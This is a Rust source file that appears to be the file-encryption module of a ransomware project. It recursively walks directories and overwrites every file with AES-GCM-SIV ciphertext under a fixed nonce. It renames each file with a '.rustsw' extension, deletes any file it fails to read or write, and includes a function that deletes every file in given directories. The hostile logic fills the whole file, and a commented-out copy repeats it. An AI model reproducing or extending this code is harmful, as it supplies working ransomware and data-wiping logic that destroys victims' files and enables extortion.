use aes_gcm_siv::aead::consts::{B0, B1};
use aes_gcm_siv::aead::generic_array::typenum::{UInt, UTerm};
use aes_gcm_siv::aead::generic_array::GenericArray;
use aes_gcm_siv::aead::{Aead, NewAead};
use aes_gcm_siv::{Aes128GcmSiv, Aes256GcmSiv, Key, Nonce};
use rand::prelude::*;
use rand_hc::Hc128Rng;
use std::fs;
use std::path;
use walkdir::WalkDir;

const ENCRYPTED_EXTENSION: &str = ".rustsw";

pub struct Encryptor256bit {
    nonce: GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>>,
    cipher: Aes256GcmSiv,
}

pub struct Encryptor128bit {
    nonce: GenericArray<u8, UInt<UInt<UInt<UInt<UTerm, B1>, B1>, B0>, B0>>,
    cipher: Aes128GcmSiv,
}

impl Encryptor256bit {
    pub fn from(key_bytes: [u8; 32], nonce_bytes: [u8; 12]) -> Encryptor256bit {
        let key = Key::from(key_bytes);
        let cipher = Aes256GcmSiv::new(&key);
        let nonce = Nonce::from(nonce_bytes);

        Encryptor256bit { nonce, cipher }
    }

    pub fn encrypt(&self, plain_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.encrypt(&self.nonce, plain_text.as_ref()) {
            Ok(encrypted_text) => encrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn decrypt(&self, encrypted_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.decrypt(&self.nonce, encrypted_text.as_ref()) {
            Ok(decrypted_text) => decrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn encrypt_file_else_delete(&self, path: &String) {
        let bytes_to_encrypt = match fs::read(&path) {
            Ok(bytes) => bytes,
            Err(_) => {
                self.attempt_delete_file(&path);
                return;
            }
        };
        let bytes_encrypted = self.encrypt(&bytes_to_encrypt);

        match fs::write(&path, bytes_encrypted) {
            Ok(_) => (),
            Err(_) => {
                self.attempt_delete_file(&path);
            }
        };
    }

    pub fn encrypt_dir(&self, dir: &String) -> bool {
        let files = self.get_files_recursively(&dir);

        self.encrypt_files(&files);
        true
    }

    pub fn encrypt_files(&self, files: &Vec<String>) {
        for file in files {
            println!("Name: {}", &file); // HACK DEBUG print
            self.encrypt_file_else_delete(&file);

            match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
                Ok(_) => (),
                Err(_) => (),
            };
        }
    }

    fn attempt_delete_file(&self, path: &String) {
        match fs::remove_file(path) {
            Ok(_) => (),
            Err(_) => (),
        };
    }

    fn get_files_recursively(&self, path: &String) -> Vec<String> {
        let mut files: Vec<String> = vec![];

        for file in WalkDir::new(&path).into_iter().filter_map(|file| file.ok()) {
            if file.metadata().unwrap().is_file() {
                files.push(file.path().display().to_string());
            }
        }

        files
    }
}

impl Encryptor128bit {
    pub fn from(key_bytes: [u8; 16], nonce_bytes: [u8; 12]) -> Encryptor128bit {
        let key = Key::from(key_bytes);
        let cipher = Aes128GcmSiv::new(&key);
        let nonce = Nonce::from(nonce_bytes);

        Encryptor128bit { nonce, cipher }
    }

    pub fn encrypt(&self, plain_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.encrypt(&self.nonce, plain_text.as_ref()) {
            Ok(encrypted_text) => encrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn decrypt(&self, encrypted_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.decrypt(&self.nonce, encrypted_text.as_ref()) {
            Ok(decrypted_text) => decrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn encrypt_file_else_delete(&self, path: &String) {
        let bytes_to_encrypt = match fs::read(&path) {
            Ok(bytes) => bytes,
            Err(_) => {
                self.attempt_delete_file(&path);
                return;
            }
        };
        let bytes_encrypted = self.encrypt(&bytes_to_encrypt);

        match fs::write(&path, bytes_encrypted) {
            Ok(_) => (),
            Err(_) => {
                self.attempt_delete_file(&path);
            }
        };
    }

    pub fn encrypt_dir(&self, dir: &String) -> bool {
        let files = self.get_files_recursively(&dir);

        self.encrypt_files(&files);
        true
    }

    pub fn encrypt_files(&self, files: &Vec<String>) {
        for file in files {
            println!("Name: {}", &file); // HACK DEBUG print
            self.encrypt_file_else_delete(&file);

            match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
                Ok(_) => (),
                Err(_) => (),
            };
        }
    }

    pub fn delete_files_in_dirs(&self, dirs: &Vec<String>) {
        for dir in dirs {
            let files = self.get_files_recursively(&dir);

            for file in files {
                self.attempt_delete_file(&file);
                println!("{}", &file.to_string());
            }
        }
    }

    fn attempt_delete_file(&self, path: &String) {
        match fs::remove_file(path) {
            Ok(_) => (),
            Err(_) => (),
        };
    }

    fn get_files_recursively(&self, path: &String) -> Vec<String> {
        let mut files: Vec<String> = vec![];

        for file in WalkDir::new(&path).into_iter().filter_map(|file| file.ok()) {
            if file.metadata().unwrap().is_file() {
                files.push(file.path().display().to_string());
            }
        }

        files
    }
}

/*
impl Encryptor256bit {
    pub fn encrypt(&self, plain_text: &Vec<u8>) -> Vec<u8> {
        match self.cipher.encrypt(&self.nonce, plain_text.as_ref()) {
            Ok(encrypted_text) => encrypted_text,
            Err(_) => vec![],
        }
    }

    pub fn encrypt_file_else_delete(&self, path: &String) {
        let bytes_to_encrypt = match fs::read(&path) {
            Ok(bytes) => bytes,
            Err(_) => {
                self.attempt_delete_file(&path);
                return;
            }
        };
        let bytes_encrypted = self.encrypt(&bytes_to_encrypt);

        match fs::write(&path, bytes_encrypted) {
            Ok(_) => (),
            Err(_) => {
                self.attempt_delete_file(&path);
            }
        };
    }

    pub fn encrypt_dir(&self, dir: &String) -> bool {
        let files = self.get_files_recursively(&dir);

        self.encrypt_files(&files);
        true
    }

    pub fn encrypt_files(&self, files: &Vec<String>) {
        for file in files {
            println!("Name: {}", &file); // HACK DEBUG print
            self.encrypt_file_else_delete(&file);

            match fs::rename(&file, String::from(file) + ENCRYPTED_EXTENSION) {
                Ok(_) => (),
                Err(_) => (),
            };
        }
    }

    fn attempt_delete_file(&self, path: &String) {
        match fs::remove_file(path) {
            Ok(_) => (),
            Err(_) => (),
        };
    }

    fn get_files_recursively(&self, path: &String) -> Vec<String> {
        let mut files: Vec<String> = vec![];

        for file in WalkDir::new(&path).into_iter().filter_map(|file| file.ok()) {
            if file.metadata().unwrap().is_file() {
                files.push(file.path().display().to_string());
            }
        }

        files
    }
}
*/
